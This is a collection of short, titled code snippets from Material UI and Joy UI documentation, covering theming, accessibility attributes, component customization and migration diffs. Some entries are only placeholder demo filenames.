LANGUAGE: javascript
CODE:
const Stat = React.forwardRef(function Stat(props, ref) {
  const { value, unit, ...other } = props;

  return (
    <StatRoot ref={ref} {...other}>
      <StatValue>{value}</StatValue>
      <StatUnit>{unit}</StatUnit>
    </StatRoot>
  );
});

export default Stat;

----------------------------------------

TITLE: Implementing Accessible Tabs in React
DESCRIPTION: Demonstrates how to make tabs accessible by associating a label using either the 'id' attribute or 'aria-label' prop, following WAI-ARIA Authoring Practices.

LANGUAGE: jsx
CODE:
<Typography id="tabs-accessibility-label">Meaningful label</Typography>
<Tabs aria-labelledby="tabs-accessibility-label">...</Tabs>

LANGUAGE: jsx
CODE:
<Tabs aria-label="Meaningful label">...</Tabs>

----------------------------------------

TITLE: Updating ServerStyleSheets import
DESCRIPTION: Change ServerStyleSheets import from @mui/material/styles to @mui/styles.

LANGUAGE: diff
CODE:
-import { ServerStyleSheets } from '@mui/material/styles';
+import { ServerStyleSheets } from '@mui/styles';

----------------------------------------

TITLE: Using useScrollTrigger Hook for Scroll-Responsive App Bar in React
DESCRIPTION: This snippet shows how to use the useScrollTrigger hook to create a scroll-responsive App Bar. The example demonstrates hiding the App Bar on scroll down to provide more reading space.

LANGUAGE: jsx
CODE:
import useScrollTrigger from '@mui/material/useScrollTrigger';

function HideOnScroll(props) {
  const trigger = useScrollTrigger();
  return (
    <Slide in={!trigger}>
      <div>Hello</div>
    </Slide>
  );
}

----------------------------------------

TITLE: Configuring Responsive Viewport Meta Tag for Joy UI
DESCRIPTION: HTML meta tag configuration required for proper rendering and touch zooming across all devices. This tag ensures mobile-first responsive behavior of Joy UI components.

LANGUAGE: html
CODE:
<meta name="viewport" content="initial-scale=1, width=device-width" />

----------------------------------------

TITLE: Implementing ThemeRegistry for Emotion with Next.js
DESCRIPTION: Custom ThemeRegistry component implementation that combines Emotion's CacheProvider, ThemeProvider, and Next.js server insertion hooks for proper CSS-in-JS handling.

LANGUAGE: typescript
CODE:
'use client';
import createCache from '@emotion/cache';
import { useServerInsertedHTML } from 'next/navigation';
import { CacheProvider, ThemeProvider } from '@emotion/react';
import theme from '/path/to/your/theme';

export default function ThemeRegistry(props) {
  const { options, children } = props;

  const [{ cache, flush }] = React.useState(() => {
    const cache = createCache(options);
    cache.compat = true;
    const prevInsert = cache.insert;
    let inserted: string[] = [];
    cache.insert = (...args) => {
      const serialized = args[1];
      if (cache.inserted[serialized.name] === undefined) {
        inserted.push(serialized.name);
      }
      return prevInsert(...args);
    };
    const flush = () => {
      const prevInserted = inserted;
      inserted = [];
      return prevInserted;
    };
    return { cache, flush };
  });

  useServerInsertedHTML(() => {
    const names = flush();
    if (names.length === 0) {
      return null;
    }
    let styles = '';
    for (const name of names) {
      styles += cache.inserted[name];
    }
    return (
      <style
        key={cache.key}
        data-emotion={`${cache.key} ${names.join(' ')}`}
        dangerouslySetInnerHTML={{
          __html: styles,
        }}
      />
    );
  });

  return (
    <CacheProvider value={cache}>
      <ThemeProvider theme={theme}>{children}</ThemeProvider>
    </CacheProvider>
  );
}

----------------------------------------

TITLE: HTML Input Control with TextField
DESCRIPTION: Example of controlling an HTML input element within a TextField component using slotProps.htmlInput.

LANGUAGE: jsx
CODE:
<TextField slotProps={{ htmlInput: { 'data-testid': '…' } }} />

----------------------------------------

TITLE: Responsive Dialog Implementation in React
DESCRIPTION: Example of creating a responsive dialog using useMediaQuery hook to make the dialog full screen on smaller devices.

LANGUAGE: jsx
CODE:
import useMediaQuery from '@mui/material/useMediaQuery';

function MyComponent() {
  const theme = useTheme();
  const fullScreen = useMediaQuery(theme.breakpoints.down('md'));

  return <Dialog fullScreen={fullScreen} />;
}

----------------------------------------

TITLE: Implementing Color Theme with createTheme and ThemeProvider
DESCRIPTION: This code snippet shows how to implement a color theme using the createTheme function and ThemeProvider component. It uses the purple color from Material UI's color palette for the primary color.

LANGUAGE: jsx
CODE:
import { createTheme } from '@mui/material/styles';
import { purple } from '@mui/material/colors';

const theme = createTheme({
  palette: {
    primary: {
      main: purple[500],
    },
    secondary: {
      main: '#f44336',
    },
  },
});

----------------------------------------

TITLE: Manual migration from JSS to sx API in Material UI v5
DESCRIPTION: Shows how to manually migrate from JSS makeStyles to the sx API for creating responsive styles or minor CSS overrides.

LANGUAGE: diff
CODE:
 import Chip from '@mui/material/Chip';
-import makeStyles from '@mui/styles/makeStyles';
+import Box from '@mui/material/Box';

-const useStyles = makeStyles((theme) => ({
-  wrapper: {
-    display: 'flex',
-  },
-  chip: {
-    padding: theme.spacing(1, 1.5),
-    boxShadow: theme.shadows[1],
-  }
-}));

 function App() {
-  const classes = useStyles();
   return (
-    <div className={classes.wrapper}>
-      <Chip className={classes.chip} label="Chip" />
-    </div>
+    <Box sx={{ display: 'flex' }}>
+      <Chip label="Chip" sx={{ py: 1, px: 1.5, boxShadow: 1 }} />
+    </Box>
   );
 }

----------------------------------------

TITLE: Rendering Basic Floating Action Buttons in React
DESCRIPTION: Demonstrates the basic usage of Floating Action Buttons (FAB) in a React component. This snippet likely showcases different variations of FABs with various icons and colors.

LANGUAGE: jsx
CODE:
"FloatingActionButtons.js"

----------------------------------------

TITLE: Creating a Forward Ref Compatibility Shim for React 19
DESCRIPTION: Implements a forwardRef shim that ensures correct prop ordering and type safety across React versions, addressing ref handling changes in React 19.

LANGUAGE: typescript
CODE:
export const forwardRef = <T, P = {}>(
  render: React.ForwardRefRenderFunction<T, P & { ref: React.Ref<T> }>,
) => {
  if (reactMajor >= 19) {
    const Component = (props: any) => render(props, props.ref ?? null);
    Component.displayName = render.displayName ?? render.name;
    return Component as React.ForwardRefExoticComponent<P>;
  }
  return React.forwardRef(
    render as React.ForwardRefRenderFunction<T, React.PropsWithoutRef<P>>,
  );
};

----------------------------------------

TITLE: Setting Contrast Threshold for Accessibility in JavaScript
DESCRIPTION: This snippet demonstrates how to set a custom contrast threshold to meet WCAG 2.1 Rule 1.4.3 accessibility requirements.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';

const theme = createTheme({
  palette: {
    contrastThreshold: 4.5,
  },
});

----------------------------------------

TITLE: Rendering a Link in a List Item with React
DESCRIPTION: Demonstrates how to render a link within a list item using the ListItemButton component. This snippet shows how to set the component prop to 'a' and provide an href attribute.

LANGUAGE: jsx
CODE:
<ListItemButton component="a" href="#simple-list">
  <ListItemText primary="Spam" />
</ListItemButton>

----------------------------------------

TITLE: Implementing Button Variants with Joy UI in JSX
DESCRIPTION: Demonstrates how to use the four global variants (solid, soft, outlined, and plain) available for Joy UI components, specifically with the Button component.

LANGUAGE: JSX
CODE:
<Button variant="solid">
<Button variant="soft">
<Button variant="outlined">
<Button variant="plain">

----------------------------------------

TITLE: Customizing Autocomplete Rendering with renderInput Prop
DESCRIPTION: This snippet shows how to use the renderInput prop to customize the rendered input of the Autocomplete component, with special attention to ref and inputProps.

LANGUAGE: jsx
CODE:
<Autocomplete
  renderInput={(params) => (
    <TextField
      {...params}
      inputProps={{
        ...params.inputProps,
        autoComplete: 'new-password',
      }}
    />
  )}
/>

----------------------------------------

TITLE: Importing Basic List Components in React
DESCRIPTION: Shows the basic import statements for the List and ListItem components from Material-UI. These are the fundamental building blocks for creating lists in React applications using Material-UI.

LANGUAGE: javascript
CODE:
import List from '@mui/material/List';
import ListItem from '@mui/material/ListItem';

----------------------------------------

TITLE: Implementing Basic Modal in React
DESCRIPTION: Demonstrates the basic usage of the Modal component in React. It shows how to create a simple modal with a button to open it.

LANGUAGE: JSX
CODE:
<Modal keepMounted />

----------------------------------------

TITLE: Customizing Typography Variants in Material UI
DESCRIPTION: Shows how to customize individual typography variants in the theme, including font size, weight, and style modifications.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  typography: {
    subtitle1: {
      fontSize: 12,
    },
    body1: {
      fontWeight: 500,
    },
    button: {
      fontStyle: 'italic',
    },
  },
});

----------------------------------------

TITLE: Applying Responsive Styles with CSS Media Queries in Material UI
DESCRIPTION: This snippet demonstrates how to use theme.breakpoints helpers to apply responsive styles based on screen width. It changes the background color for different breakpoints using CSS-in-JS.

LANGUAGE: jsx
CODE:
const styles = (theme) => ({
  root: {
    padding: theme.spacing(1),
    [theme.breakpoints.down('md')]: {
      backgroundColor: theme.palette.secondary.main,
    },
    [theme.breakpoints.up('md')]: {
      backgroundColor: theme.palette.primary.main,
    },
    [theme.breakpoints.up('lg')]: {
      backgroundColor: green[500],
    },
  },
});

----------------------------------------

TITLE: Customizing Number Input Slot Props in React
DESCRIPTION: This snippet shows how to pass custom props to internal slots of the Number Input component using the 'slotProps' prop.

LANGUAGE: jsx
CODE:
<NumberInput
  slotProps={{
    input: { className: 'my-num-input' },
    incrementButton: { direction: 'UP' },
    decrementButton: { direction: 'DOWN' },
  }}
/>

----------------------------------------

TITLE: Animated Popper with Transitions in React
DESCRIPTION: Shows how to implement transitions for the Popper component using react-transition-group. The example demonstrates open/close animations for the popper.

LANGUAGE: JavaScript
CODE:
{"demo": "TransitionsPopper.js"}

----------------------------------------

TITLE: Disabling Default CSS Classes for MUI Base Components
DESCRIPTION: This snippet demonstrates how to disable the default CSS classes for MUI Base components using the ClassNameConfigurator. It shows the difference between a button with and without default classes.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { Button } from '@mui/base/Button';
import { ClassNameConfigurator } from '@mui/base/utils';

export default function DisabledDefaultClasses() {
  return (
    <div style={{ display: 'flex', gap: 8 }}>
      <Button className="custom-button">Default classes</Button>
      <ClassNameConfigurator disableDefaultClasses>
        <Button className="custom-button">Disabled default classes</Button>
      </ClassNameConfigurator>
      <style>{`
        .custom-button {
          font-family: IBM Plex Sans,sans-serif;
          font-weight: 600;
          font-size: 0.875rem;
          line-height: 1.5;
          background-color: #007FFF;
          padding: 8px 16px;
          border-radius: 8px;
          color: white;
          cursor: pointer;
          border: none;
        }
        .custom-button:hover {
          background-color: #0059B2;
        }
      `}</style>
    </div>
  );
}

----------------------------------------

TITLE: Joy UI React Peer Dependencies Configuration
DESCRIPTION: Peer dependency requirements for React and React DOM versions compatible with Joy UI.

LANGUAGE: json
CODE:
"peerDependencies": {
  "react": "^17.0.0 || ^18.0.0 || ^19.0.0",
  "react-dom": "^17.0.0 || ^18.0.0 || ^19.0.0"
}

----------------------------------------

TITLE: Basic Tabs Implementation in React
DESCRIPTION: Demonstrates the basic usage of Tabs, TabList, Tab, and TabPanel components. The 'value' prop on TabPanel and 'defaultValue' on Tabs are used to control the selected tab.

LANGUAGE: jsx
CODE:
<Tabs defaultValue={0}>
  <TabList>
    <Tab>First tab</Tab>
    <Tab>Second tab</Tab>
    <Tab>Third tab</Tab>
  </TabList>
  <TabPanel value={0}>First panel</TabPanel>
  <TabPanel value={1}>Second panel</TabPanel>
  <TabPanel value={2}>Third panel</TabPanel>
</Tabs>

----------------------------------------

TITLE: TypeScript Module Augmentation for Custom Breakpoints
DESCRIPTION: This TypeScript code snippet shows how to use module augmentation to extend the Material UI theme types for custom breakpoints. It removes default breakpoints and adds new custom ones.

LANGUAGE: ts
CODE:
declare module '@mui/material/styles' {
  interface BreakpointOverrides {
    xs: false; // removes the `xs` breakpoint
    sm: false;
    md: false;
    lg: false;
    xl: false;
    mobile: true; // adds the `mobile` breakpoint
    tablet: true;
    laptop: true;
    desktop: true;
  }
}

----------------------------------------

TITLE: Configuring Theme for Portal Components in Shadow DOM
DESCRIPTION: This code configures the Material UI theme to render portal-based components (Popover, Popper, Modal) within the shadow DOM container.

LANGUAGE: tsx
CODE:
const theme = createTheme({
  components: {
    MuiPopover: {
      defaultProps: {
        container: shadowRootElement,
      },
    },
    MuiPopper: {
      defaultProps: {
        container: shadowRootElement,
      },
    },
    MuiModal: {
      defaultProps: {
        container: shadowRootElement,
      },
    },
  },
});

// ...

<ThemeProvider theme={theme}>
  <App />
</ThemeProvider>;

----------------------------------------

TITLE: Creating Styled Component Slots with Joy UI
DESCRIPTION: Demonstrates how to create styled component slots using Joy UI's styled API with name and slot parameters for a statistics component

LANGUAGE: javascript
CODE:
import * as React from 'react';
import { styled } from '@mui/joy/styles';

const StatRoot = styled('div', {
  name: 'JoyStat', // The component name
  slot: 'root', // The slot name
})(({ theme }) => ({
  display: 'flex',
  flexDirection: 'column',
  gap: theme.spacing(0.5),
  padding: theme.spacing(3, 4),
  backgroundColor: theme.vars.palette.background.surface,
  borderRadius: theme.vars.radius.sm,
  boxShadow: theme.vars.shadow.md,
}));

const StatValue = styled('div', {
  name: 'JoyStat',
  slot: 'value',
})(({ theme }) => ({
  ...theme.typography.h2,
}));

const StatUnit = styled('div', {
  name: 'JoyStat',
  slot: 'unit',
})(({ theme }) => ({
  ...theme.typography['body-sm'],
  color: theme.vars.palette.text.tertiary,
}));

----------------------------------------

TITLE: Adding New Color Palettes to Joy UI Theme
DESCRIPTION: Illustrates how to add entirely new color palettes to the Joy UI theme, making them available through the color prop. This example adds a custom secondary palette with light and dark color schemes.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  colorSchemes: {
    light: {
      palette: {
        secondary: {
          // Credit:
          // https://github.com/tailwindlabs/tailwindcss/blob/master/src/public/colors.js
          50: '#fdf2f8',
          100: '#fce7f3',
          200: '#fbcfe8',
          300: '#f9a8d4',
          400: '#f472b6',
          500: '#ec4899',
          600: '#db2777',
          700: '#be185d',
          800: '#9d174d',
          900: '#831843',
          // Adjust the global variant tokens as you'd like.
          // The tokens should be the same for all color schemes.
          solidBg: 'var(--joy-palette-secondary-400)',
          solidActiveBg: 'var(--joy-palette-secondary-500)',
          outlinedBorder: 'var(--joy-palette-secondary-500)',
          outlinedColor: 'var(--joy-palette-secondary-700)',
          outlinedActiveBg: 'var(--joy-palette-secondary-100)',
          softColor: 'var(--joy-palette-secondary-800)',
          softBg: 'var(--joy-palette-secondary-200)',
          softActiveBg: 'var(--joy-palette-secondary-300)',
          plainColor: 'var(--joy-palette-secondary-700)',
          plainActiveBg: 'var(--joy-palette-secondary-100)',
        },
      },
    },
    dark: {
      palette: {
        secondary: {
          // Credit:
          // https://github.com/tailwindlabs/tailwindcss/blob/master/src/public/colors.js
          50: '#fdf2f8',
          100: '#fce7f3',
          200: '#fbcfe8',
          300: '#f9a8d4',
          400: '#f472b6',
          500: '#ec4899',
          600: '#db2777',
          700: '#be185d',
          800: '#9d174d',
          900: '#831843',
          // Adjust the global variant tokens as you'd like.
          // The tokens should be the same for all color schemes.
          solidBg: 'var(--joy-palette-secondary-400)',
          solidActiveBg: 'var(--joy-palette-secondary-500)',
          outlinedBorder: 'var(--joy-palette-secondary-700)',
          outlinedColor: 'var(--joy-palette-secondary-600)',
          outlinedActiveBg: 'var(--joy-palette-secondary-900)',
          softColor: 'var(--joy-palette-secondary-500)',
          softBg: 'var(--joy-palette-secondary-900)',
          softActiveBg: 'var(--joy-palette-secondary-800)',
          plainColor: 'var(--joy-palette-secondary-500)',
          plainActiveBg: 'var(--joy-palette-secondary-900)',
        },
      },
    },
  },
});

// Then, pass it to `<CssVarsProvider theme={theme}>`.

----------------------------------------

TITLE: MUI Typography Variant Usage
DESCRIPTION: Examples of applying different typography variants using the Box component with the typography prop. These map to theme typography settings.

LANGUAGE: jsx
CODE:
<Box sx={{ typography: 'subtitle2' }}>… // theme.typography.subtitle2
<Box sx={{ typography: 'body1' }}>…
<Box sx={{ typography: 'body2' }}>…

----------------------------------------

TITLE: Implementing Right-Aligned Timeline in React
DESCRIPTION: Shows how to create a right-aligned timeline by adjusting the relative width of the left and right sides.

LANGUAGE: jsx
CODE:
{"demo": "RightAlignedTimeline.js"}

----------------------------------------

TITLE: Implementing a Vertical Stepper with Extra Content in React
DESCRIPTION: This code shows how to create a vertical stepper with additional content in each step. It demonstrates the use of the orientation prop and how to structure more complex step content.

LANGUAGE: jsx
CODE:
<Stepper orientation="vertical">
  <Step>
    <div>
      <Typography>Step 1</Typography>
      <Typography level="body-sm">
        For each ad campaign that you create, you can control how much you're
        willing to spend on clicks and conversions, which networks and
        geographical locations you want your ads to show on, and more.
      </Typography>
    </div>
  </Step>
  {/* Additional steps... */}
</Stepper>

----------------------------------------

TITLE: Implementing Value Set Enforcement in Toggle Buttons
DESCRIPTION: Example of how to enforce at least one active button in both single and multiple selection modes. The handlers ensure that a value is always selected by preventing null or empty selections.

LANGUAGE: jsx
CODE:
const handleAlignment = (event, newAlignment) => {
  if (newAlignment !== null) {
    setAlignment(newAlignment);
  }
};

const handleDevices = (event, newDevices) => {
  if (newDevices.length) {
    setDevices(newDevices);
  }
};

----------------------------------------

TITLE: Button Component HTML Structure
DESCRIPTION: Shows the basic HTML structure/anatomy of the Button component

LANGUAGE: html
CODE:
<button class="base-Button-root">
  <!-- button text goes here -->
</button>

----------------------------------------

TITLE: Component Implementation with ForwardRef
DESCRIPTION: Shows complete implementation of a public component using React.forwardRef with proper theme integration and styling.

LANGUAGE: typescript
CODE:
const Foo = React.forwardRef<HTMLSpanElement, FooProps>(function Foo(inProps, ref) => {
  const props = useThemeProps<Theme, FooProps, 'MuiFoo'>({
    props: inProps,
    name: 'MuiFoo',
  });
  const { children, className, ...other } = props

  const ownerState = { ...props, ...otherValue }

  const classes = useUtilityClasses(ownerState);

  return (
    <FooRoot
      ref={ref}
      className={clsx(classes.root, className)}
      ownerState={ownerState}
      {...other}
    >
      {children}
    </FooRoot>
  )
})

----------------------------------------

TITLE: MUI Font Weight Control
DESCRIPTION: Examples of controlling font weight using the Box component, including theme-based and numeric values.

LANGUAGE: jsx
CODE:
<Box sx={{ fontWeight: 'light' }}>… // theme.typography.fontWeightLight
<Box sx={{ fontWeight: 'regular' }}>…
<Box sx={{ fontWeight: 'medium' }}>…
<Box sx={{ fontWeight: 500 }}>…
<Box sx={{ fontWeight: 'bold' }}>…

----------------------------------------

TITLE: Implementing Basic Grid Layout in React
DESCRIPTION: Demonstrates a basic grid layout using the GridLegacy component with different column widths for various breakpoints.

LANGUAGE: JSX
CODE:
<Grid container spacing={2}>
  <Grid item xs={8}>
    <Item>xs=8</Item>
  </Grid>
  <Grid item xs={4}>
    <Item>xs=4</Item>
  </Grid>
  <Grid item xs={4}>
    <Item>xs=4</Item>
  </Grid>
  <Grid item xs={8}>
    <Item>xs=8</Item>
  </Grid>
</Grid>

----------------------------------------

TITLE: Adding removed purple palette to theme
DESCRIPTION: Code snippet to add the removed purple palette back to the Joy UI theme.

LANGUAGE: javascript
CODE:
const purple = {
  50: '#FDF7FF',
  100: '#F4EAFF',
  200: '#E1CBFF',
  300: '#C69EFF',
  400: '#A374F9',
  500: '#814DDE',
  600: '#5F35AE',
  700: '#452382',
  800: '#301761',
  900: '#1D0A42',
};

----------------------------------------

TITLE: Customizing Menu Structure with Slots in React
DESCRIPTION: This example demonstrates how to use the 'slots' prop to override the default HTML elements used in the Menu component.

LANGUAGE: jsx
CODE:
<Menu slots={{ listbox: 'ol' }} />

----------------------------------------

TITLE: Configuring Theme Variables in Material UI
DESCRIPTION: Example of modifying theme configuration variables to customize component appearance globally. This snippet shows how to adjust typography settings for buttons.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  typography: {
    button: {
      fontSize: '1rem',
    },
  },
});

----------------------------------------

TITLE: Implementing Fixed Bottom Navigation in React with Material-UI
DESCRIPTION: This snippet demonstrates how to create a fixed bottom navigation bar that remains at the bottom of the screen regardless of content. It uses the BottomNavigation, BottomNavigationAction, and Paper components from Material-UI.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { styled } from '@mui/material/styles';
import AppBar from '@mui/material/AppBar';
import CssBaseline from '@mui/material/CssBaseline';
import Box from '@mui/material/Box';
import Container from '@mui/material/Container';
import Toolbar from '@mui/material/Toolbar';
import Typography from '@mui/material/Typography';
import IconButton from '@mui/material/IconButton';
import Paper from '@mui/material/Paper';
import Fab from '@mui/material/Fab';
import List from '@mui/material/List';
import ListItem from '@mui/material/ListItem';
import ListItemAvatar from '@mui/material/ListItemAvatar';
import ListItemText from '@mui/material/ListItemText';
import ListSubheader from '@mui/material/ListSubheader';
import Avatar from '@mui/material/Avatar';
import MenuIcon from '@mui/icons-material/Menu';
import AddIcon from '@mui/icons-material/Add';
import SearchIcon from '@mui/icons-material/Search';
import MoreIcon from '@mui/icons-material/MoreVert';
import BottomNavigation from '@mui/material/BottomNavigation';
import BottomNavigationAction from '@mui/material/BottomNavigationAction';
import RestoreIcon from '@mui/icons-material/Restore';
import FavoriteIcon from '@mui/icons-material/Favorite';
import ArchiveIcon from '@mui/icons-material/Archive';

const StyledFab = styled(Fab)({
  position: 'absolute',
  zIndex: 1,
  top: -30,
  left: 0,
  right: 0,
  margin: '0 auto',
});

export default function FixedBottomNavigation() {
  const [value, setValue] = React.useState(0);
  const ref = React.useRef(null);

  React.useEffect(() => {
    ref.current.ownerDocument.body.scrollTop = 0;
  }, [value]);

  return (
    <Box sx={{ pb: 7 }} ref={ref}>
      <CssBaseline />
      <Paper sx={{ position: 'fixed', bottom: 0, left: 0, right: 0 }} elevation={3}>
        <BottomNavigation
          showLabels
          value={value}
          onChange={(event, newValue) => {
            setValue(newValue);
          }}
        >
          <BottomNavigationAction label="Recents" icon={<RestoreIcon />} />
          <BottomNavigationAction label="Favorites" icon={<FavoriteIcon />} />
          <BottomNavigationAction label="Archive" icon={<ArchiveIcon />} />
        </BottomNavigation>
      </Paper>
    </Box>
  );
}

----------------------------------------

TITLE: Component Props Interface Definition
DESCRIPTION: Shows how to define and export component props interfaces with proper documentation and system props support.

LANGUAGE: typescript
CODE:
import { FooClasses } from './fooClasses';

export interface FooProps {
  /**
   * Override or extend the styles applied to the component.
   */
  classes?: Partial<FooClasses>;
  // ...other props
  /**
   * The system prop that allows defining system overrides as well as additional CSS styles.
   */
  sx?: SxProps<Theme>;
}

----------------------------------------

TITLE: Importing Box Component in React
DESCRIPTION: Basic import statement for the Box component from Material UI.

LANGUAGE: jsx
CODE:
import Box from '@mui/material/Box';

----------------------------------------

TITLE: Implementing Accessible Modal
DESCRIPTION: Example of implementing Modal with proper accessibility attributes for labels and descriptions.

LANGUAGE: jsx
CODE:
<Modal aria-labelledby="modal-title" aria-describedby="modal-description">
  <h2 id="modal-title">My Title</h2>
  <p id="modal-description">My Description</p>
</Modal>

----------------------------------------

TITLE: React Chip Component Playground
DESCRIPTION: An interactive playground for experimenting with various Chip component properties and configurations.

LANGUAGE: JSX
CODE:
{"demo": "ChipsPlayground.js", "hideToolbar": true}

----------------------------------------

TITLE: Accessible Badge Implementation in React
DESCRIPTION: Shows how to implement accessible badges using aria-label for proper screen reader support.

LANGUAGE: jsx
CODE:
AccessibleBadges.js referenced but not provided

----------------------------------------

TITLE: Adding Labels to Switches in React
DESCRIPTION: Shows how to add labels to switches using the FormControlLabel component from Material-UI.

LANGUAGE: jsx
CODE:
{"demo": "SwitchLabels.js"}

----------------------------------------

TITLE: Implementing Custom Slider Component
DESCRIPTION: Creation of a custom Slider component using MUI Base Slider with Tailwind CSS styling. Includes custom thumb implementation and styling for different slider parts.

LANGUAGE: tsx
CODE:
import * as React from 'react';
import {
  Slider as BaseSlider,
  SliderThumbSlotProps,
  SliderProps,
} from '@mui/base/Slider';

const Slider = React.forwardRef(function Slider(
  props: SliderProps,
  ref: React.ForwardedRef<HTMLSpanElement>,
) {
  return (
    <BaseSlider
      {...props}
      ref={ref}
      slotProps={{
        thumb: {
          className:
            'ring-cyan-500 dark:ring-cyan-400 ring-2 w-4 h-4 -mt-1 -ml-2 flex items-center justify-center bg-white rounded-full shadow absolute',
        },
        root: { className: 'w-full relative inline-block h-2 cursor-pointer' },
        rail: {
          className:
            'bg-slate-100 dark:bg-slate-700 h-2 w-full rounded-full block absolute',
        },
        track: {
          className: 'bg-cyan-500 dark:bg-cyan-400 h-2 absolute rounded-full',
        },
      }}
    />
  );
});

export default Slider;

----------------------------------------

TITLE: Importing Stack Component in React
DESCRIPTION: This snippet shows how to import the Stack component from the MUI system package. The Stack component is used for arranging elements vertically or horizontally.

LANGUAGE: jsx
CODE:
import Stack from '@mui/system/Stack';

----------------------------------------

TITLE: Configuring TypeScript for Material UI in tsconfig.json
DESCRIPTION: Minimum recommended TypeScript configuration options for use with Material UI. These settings ensure proper type checking and compatibility.

LANGUAGE: json
CODE:
{
  "compilerOptions": {
    "lib": ["es6", "dom"],
    "noImplicitAny": true,
    "noImplicitThis": true,
    "strictNullChecks": true,
    "allowSyntheticDefaultImports": true
  }
}

----------------------------------------

TITLE: Implementing Theme Mode Toggle
DESCRIPTION: Creation of a theme mode switcher component using useColorScheme hook for toggling between light and dark modes.

LANGUAGE: jsx
CODE:
function ModeToggle() {
  const { mode, setMode } = useColorScheme();
  const [mounted, setMounted] = React.useState(false);

  React.useEffect(() => {
    setMounted(true);
  }, []);
  if (!mounted) {
    return null;
  }

  return (
    <Select
      value={mode}
      onChange={(event, newMode) => {
        setMode(newMode);
      }}
      sx={{ width: 'max-content' }}
    >
      <Option value="system">System</Option>
      <Option value="light">Light</Option>
      <Option value="dark">Dark</Option>
    </Select>
  );
}

----------------------------------------

TITLE: Creating Left-Aligned Timeline without Opposite Content in React
DESCRIPTION: Demonstrates how to create a left-aligned timeline without opposite content.

LANGUAGE: jsx
CODE:
{"demo": "NoOppositeContent.js"}

----------------------------------------

TITLE: Extending Component Colors in Joy UI Theme
DESCRIPTION: Shows how to add custom colors to a Joy UI component and use TypeScript module augmentation for type safety.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoyButton: {
      styleOverrides: {
        root: ({ ownerState, theme }) => ({
          ...(ownerState.color === 'secondary' && {
            color: theme.vars.palette.text.secondary,
            backgroundColor: theme.vars.palette.background.level1,
          }),
        }),
      },
    },
  },
});

LANGUAGE: typescript
CODE:
declare module '@mui/joy/Button' {
  interface ButtonPropsColorOverrides {
    secondary: true;
    tertiary: true;
  }
}

----------------------------------------

TITLE: Basic Rating Implementation in React
DESCRIPTION: Demonstrates basic usage of the Rating component.

LANGUAGE: JavaScript
CODE:
BasicRating.js

----------------------------------------

TITLE: Disabling Transition for High Frequency Updates in LinearProgress
DESCRIPTION: This CSS snippet shows how to disable the transition effect on the LinearProgress component for scenarios requiring high-frequency updates (30+ per second). This prevents the 200ms delay between re-renders and full progress bar updates.

LANGUAGE: css
CODE:
.MuiLinearProgress-bar {
  transition: none;
}

----------------------------------------

TITLE: Manually Setting Accessibility Attributes for Select
DESCRIPTION: Shows how to manually set accessibility attributes for the Select component by targeting the button slot. This ensures proper labeling for screen readers.

LANGUAGE: jsx
CODE:
<label htmlFor="select-button" id="select-label">Label</label>
<Select
  slotProps={{
    button: {
      id: 'select-button',
      'aria-labelledby': 'select-label select-button',
    }
  }}
>
  <Option value="option1">Option I</Option>
  <Option value="option2">Option II</Option>
</Select>

----------------------------------------

TITLE: Creating a custom theme with Next.js font optimization
DESCRIPTION: Shows how to create a custom Material UI theme using Next.js font optimization with the Roboto font.

LANGUAGE: javascript
CODE:
'use client';
import { createTheme } from '@mui/material/styles';

const theme = createTheme({
  typography: {
    fontFamily: 'var(--font-roboto)',
  },
});

export default theme;

----------------------------------------

TITLE: Changing Typography Semantic Element in React
DESCRIPTION: JSX code demonstrating how to change the semantic element of a Typography component for a specific instance.

LANGUAGE: jsx
CODE:
<Typography variant="h1" component="h2">
  h1. Heading
</Typography>

----------------------------------------

TITLE: Creating a Custom Link Behavior for React Router
DESCRIPTION: This code snippet shows how to create a custom LinkBehavior component for use with React Router. It overrides the role attribute to avoid accessibility issues when rendering a link as a button.

LANGUAGE: jsx
CODE:
const LinkBehavior = React.forwardRef((props, ref) => (
  <RouterLink ref={ref} to="/" {...props} role={undefined} />
));

----------------------------------------

TITLE: Configuring Global Locale in Material UI Theme
DESCRIPTION: Example of how to configure locale text globally using Material UI's ThemeProvider and createTheme utilities. This snippet demonstrates setting up Chinese (Simplified) locale with a custom primary color.

LANGUAGE: jsx
CODE:
import { createTheme, ThemeProvider } from '@mui/material/styles';
import { zhCN } from '@mui/material/locale';

const theme = createTheme(
  {
    palette: {
      primary: { main: '#1976d2' },
    },
  },
  zhCN,
);

<ThemeProvider theme={theme}>
  <App />
</ThemeProvider>;

----------------------------------------

TITLE: Transforming Non-Standard Ranges for Progress Components in React
DESCRIPTION: This snippet demonstrates how to normalize values from a non-standard range to the 0-100 range expected by Material-UI progress components. It includes a utility function and an example React component implementation.

LANGUAGE: jsx
CODE:
// MIN = Minimum expected value
// MAX = Maximum expected value
// Function to normalise the values (MIN / MAX could be integrated)
const normalise = (value) => ((value - MIN) * 100) / (MAX - MIN);

// Example component that utilizes the `normalise` function at the point of render.
function Progress(props) {
  return (
    <React.Fragment>
      <CircularProgress variant="determinate" value={normalise(props.value)} />
      <LinearProgress variant="determinate" value={normalise(props.value)} />
    </React.Fragment>
  );
}

----------------------------------------

TITLE: Supporting Theme Default Props in Material UI
DESCRIPTION: Shows how to use the useThemeProps API to support customizing default props for the component through the theme.

LANGUAGE: javascript
CODE:
import { useThemeProps } from '@mui/material/styles';

const Stat = React.forwardRef(function Stat(inProps, ref) {
  const props = useThemeProps({ props: inProps, name: 'MuiStat' });
  const { value, unit, ...other } = props;

  return (
    <StatRoot ref={ref} {...other}>
      <StatValue>{value}</StatValue>
      <StatUnit>{unit}</StatUnit>
    </StatRoot>
  );
});

----------------------------------------

TITLE: System Preference Detection with useMediaQuery
DESCRIPTION: Demonstrates how to detect the user's system color scheme preference using the useMediaQuery hook and prefers-color-scheme media query.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import useMediaQuery from '@mui/material/useMediaQuery';
import { createTheme, ThemeProvider } from '@mui/material/styles';
import CssBaseline from '@mui/material/CssBaseline';

function App() {
  const prefersDarkMode = useMediaQuery('(prefers-color-scheme: dark)');
  return <div>prefersDarkMode: {prefersDarkMode.toString()}</div>;
}

----------------------------------------

